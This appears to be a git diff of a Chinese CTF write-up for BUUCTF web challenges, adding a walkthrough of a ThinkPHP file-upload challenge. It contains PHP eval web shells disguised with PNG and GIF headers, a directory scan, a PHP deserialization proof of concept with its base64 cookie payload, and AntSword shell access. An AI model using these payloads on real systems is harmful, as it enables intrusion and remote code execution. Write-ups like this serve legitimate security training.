@@ -20,9 +20,11 @@ tags:
 题目在 [BUUCTF](https://buuoj.cn/challenges)
 
 使用到的工具：
-1. [BurpSuite](https://portswigger.net/burp)
-2. [GitHacker](https://github.com/WangYihang/GitHacker)
-
+1. [BurpSuite](https://portswigger.net/burp) 抓包工具
+2. [GitHacker](https://github.com/WangYihang/GitHacker) 
+3. [dirsearch](https://github.com/maurosoria/dirsearch) 扫描工具
+4. [PHPStorm](https://www.jetbrains.com/phpstorm/) PHP的IDE
+5. [AntSword](https://github.com/AntSwordProject/antSword) [AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)
 # 1 Web
 ## HTTP
 ### [HTTP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)
@@ -150,4 +152,117 @@ GET /?a=a%0a);%0aphpinfo( HTTP/1.1
 GET /?a=a%0a);%0aecho%00file_get_contents(%27/flag%27 HTTP/1.1
 ```
 
-### 
+### [PHP file upload](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]Upload)
+文件上传类型限制。
+
+修改POST请求中的内容类型后
+```sh
+Content-Type: image/png
+```
+界面显示“ThinkPHP V5.1.35 LTS { 十年磨一剑-为API开发设计的高性能框架 }”
+
+PNG头0x89504E47
+```sh
+89504E47
+<script language="php">eval($_POST["cmd"])</script>
+```
+
+工具`dirsearch`需要python 3.9及以上。
+```sh
+./dirsearch.py -u http://066ef743-ac4c-49bd-a357-ccc1a1ce4f59.node5.buuoj.cn:81/ -e "*"
+```
+但显示
+```sh
+Skipped the target due to 429 status code
+```
+错误，扫描请求频率过高被服务器限制。`--delay 0.1 -t 1`延时加减线程为1.
+
+最终使用命令和结果显示
+```sh
+$ ./dirsearch.py -u http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81 -e , --delay 0.1 -t 1 -i 200,403
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions:  | HTTP method: GET | Threads: 1 | Wordlist size: 9119
+
+Target: http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/
+
+[14:56:19] Scanning: 
+[14:58:21] 200 -   216B - /.htaccess
+[15:13:50] 200 -    1KB - /favicon.ico
+[15:23:23] 200 -    24B - /robots.txt
+[15:27:15] 200 -   287B - /upload/
+[15:29:49] 200 -   24MB - /www.tar.gz
+
+Task Completed
+```
+直接在浏览器地址栏输入`http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/www.tar.gz`即可下载文件。
+
+文件代码中搜索`upload`可以定位到Register.php和Profile.php两个主要文件。
+
+index.php中显示登录会反序列化cookie
+```php
+    public function login_check(){
+        $profile=cookie('user');
+        if(!empty($profile)){
+            $this->profile=unserialize(base64_decode($profile));
+            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
+            if(array_diff($this->profile_db,$this->profile)==null){
+                return 1;
+            }else{
+                return 0;
+            }
+        }
+    }
+```
+
+图片马GIF头0xGIF89a
+```sh
+GIF89a
+<?php @eval($_POST['cmd']);?>
+
+# 或
+<script language="php">eval($_POST['cmd']);</script>
+```
+或者上传空文件后在Content-Type: 后面修改类型后再加文件内容也可以。
+
+upload.php即POC
+```php
+<?php
+namespace app\web\controller;
+
+class Profile
+{
+    public $checker = 0;
+    public $filename_tmp = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/2fffb588e7310cb65c09fd2e21a0e834.png";
+    public $filename = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/shell.php";
+    public $ext = 1;
+    public $except = array('index'=>'upload_img');
+}
+
+class Register
+{
+    public $checker;
+    public $registed = 0;
+}
+$profile = new Profile();
+$register = new Register();
+$register->checker = $profile;
+echo base64_encode(serialize($register));
+?>
+```
+
+```sh
+$ sudo apt install php7.4-cli
+
+$ php upload.php
+TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo1OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2UwY2Q3YzI4Yjc0MzI3YjNiZDE0NzIzNzhiZGZiZmEyLzJmZmZiNTg4ZTczMTBjYjY1YzA5ZmQyZTIxYTBlODM0LnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvZTBjZDdjMjhiNzQzMjdiM2JkMTQ3MjM3OGJkZmJmYTIvc2hlbGwucGhwIjtzOjM6ImV4dCI7aToxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7aTowO30=
+```
+
+刷新页面并把上面的payload放到cookie中多试几次，即可以看到upload/下原上传的图像被重命名了POC中的`filename` 
+
+使用AntSword连接重命名后的文件`http://xxx.php`，密码是前面图片马中`<?php @eval($_POST['cmd']);?>`的变量名`cmd`，连接成功。
+
+在根目录下找到/flag
+
